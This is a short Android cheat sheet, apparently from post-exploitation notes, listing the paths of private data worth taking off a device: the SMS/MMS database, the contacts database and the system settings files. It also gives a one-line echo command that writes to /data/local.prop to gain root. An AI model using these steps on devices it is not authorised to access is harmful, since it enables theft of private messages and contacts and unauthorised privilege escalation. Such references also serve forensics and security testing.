# Android

##Files to grab

###Text Messages (Needs Root):

```
/data/data/com.android.providers/telephony/databases/mmssms.db
/data/data/com.android.providers.telephony/databases/mmssms.db
```

###Contacts (Needs Root):

```
/data/data/android.providers.contacts/databases
```

###Local System Settings:

```
/data/local.prop
```

If you can write to this file the following line will grant root:

```
echo "ro.kernel.qemu=1" > /data/local.prop
```

###Device Settings:

```
/system/build.prop
```

Content coming. Feel free to submit ;-)
